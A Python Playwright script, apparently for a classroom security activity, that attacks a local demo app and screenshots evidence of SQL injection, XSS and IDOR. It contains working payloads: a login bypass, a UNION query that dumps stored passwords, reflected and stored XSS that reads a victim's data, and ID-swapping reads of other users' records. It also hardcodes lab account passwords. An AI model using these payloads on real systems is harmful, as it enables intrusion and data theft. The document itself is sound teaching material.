"""
Capturas de la Actividad 2: demostración de SQL Injection, XSS e IDOR/BOLA.
Uso (con la app corriendo):  python tools/capturas_vulns.py
"""
import os
from pathlib import Path

from playwright.sync_api import sync_playwright

BASE = "http://127.0.0.1:5050"
OUT = Path(__file__).resolve().parent.parent / "evidencias" / os.environ.get("CAPTURAS_DIR", "capturas_vulns")
OUT.mkdir(parents=True, exist_ok=True)
dialogos = []


def foto(page, nombre, full=False):
    page.screenshot(path=str(OUT / f"{nombre}.png"), full_page=full)
    print(f"  captura -> evidencias/{OUT.name}/{nombre}.png")


def nueva_sesion(browser, user=None, pwd=None):
    ctx = browser.new_context(viewport={"width": 1280, "height": 560})
    page = ctx.new_page()
    page.on("dialog", lambda d: (dialogos.append(f"{user}: alert('{d.message}')"), d.accept()))
    if user:
        page.goto(f"{BASE}/login")
        page.fill("input[name=username]", user)
        page.fill("input[name=password]", pwd)
        page.click("button[type=submit]")
    return ctx, page


with sync_playwright() as p:
    b = p.chromium.launch(headless=True, channel="chrome")

    # ---------------- 1. SQL Injection ----------------
    print("[SQLi]")
    ctx, page = nueva_sesion(b)
    page.goto(f"{BASE}/login")
    page.fill("input[name=username]", "ana.ti' --")
    page.fill("input[name=password]", "no-se-la-contrasena")
    page.evaluate("document.querySelector('input[name=password]').type='text'")  # para que se vea en la captura
    foto(page, "v01_sqli_login_payload")
    page.click("button[type=submit]")
    page.wait_for_load_state()
    foto(page, "v02_sqli_login_resultado")
    ctx.close()

    ctx, page = nueva_sesion(b, "sofia.consulta", "Consulta*26")
    page.goto(f"{BASE}/buscar?q=buje")
    foto(page, "v03_sqli_busqueda_normal")
    page.goto(f"{BASE}/buscar?q=" + "zzz' UNION SELECT username, password, rol FROM usuarios --")
    foto(page, "v04_sqli_union_usuarios")
    page.goto(f"{BASE}/buscar?q='")
    foto(page, "v05_sqli_error_expuesto")

    # ---------------- 2. XSS ----------------
    print("[XSS]")
    reflejado = ("<script>document.querySelector('main').insertAdjacentHTML('afterbegin',"
                 "'<div style=\"background:#dc2626;color:#fff;padding:12px;font-weight:bold;border-radius:6px\">"
                 "XSS reflejado: este mensaje lo insert\\u00f3 JavaScript enviado en la URL</div>')</script>")
    page.goto(f"{BASE}/buscar?q=" + reflejado.replace("#", "%23"))
    foto(page, "v06_xss_reflejado_banner")
    page.goto(f"{BASE}/buscar?q=<script>alert('XSS-Stark')</script>")
    page.wait_for_timeout(300)

    almacenado = ("<img src=x onerror=\"fetch('/api/ordenes/2').then(r=>r.text()).then(t=>"
                  "this.insertAdjacentHTML('afterend','<div style=background:#dc2626;color:#fff;padding:10px;"
                  "border-radius:6px;font-weight:bold>XSS almacenado ejecutado en el navegador de la v\\u00edctima. "
                  "Datos le\\u00eddos con SU sesi\\u00f3n: '+t+'</div>'))\">")
    page.goto(f"{BASE}/comentarios")
    page.fill("textarea[name=texto]", almacenado)
    foto(page, "v07_xss_almacenado_publicacion")
    page.click("button[type=submit]")
    page.wait_for_timeout(800)
    ctx.close()

    ctx, page = nueva_sesion(b, "luis.oper", "Turno1!2026")
    page.goto(f"{BASE}/comentarios")
    page.wait_for_timeout(1200)
    foto(page, "v08_xss_almacenado_victima")
    ctx.close()

    # ---------------- 3. IDOR / BOLA ----------------
    print("[IDOR/BOLA]")
    ctx, page = nueva_sesion(b, "luis.oper", "Turno1!2026")
    foto(page, "v09_idor_dashboard_propio")
    page.goto(f"{BASE}/api/ordenes/2")
    foto(page, "v10_bola_orden_propia")
    page.goto(f"{BASE}/api/ordenes/4")
    foto(page, "v11_bola_orden_nomina_rh")
    page.goto(f"{BASE}/api/ordenes/1")
    foto(page, "v12_bola_orden_inventario_ti")
    page.goto(f"{BASE}/perfil/2")
    foto(page, "v13_idor_perfil_propio")
    page.goto(f"{BASE}/perfil/4")
    foto(page, "v14_idor_perfil_ajeno_rh")
    page.goto(f"{BASE}/perfil/1")
    foto(page, "v15_idor_perfil_ajeno_ti")
    ctx.close()
    b.close()

(OUT.parent / f"07_dialogos_xss_{OUT.name}.txt").write_text("\n".join(dialogos) + "\n", encoding="utf-8")
print("Diálogos JavaScript capturados:", dialogos)
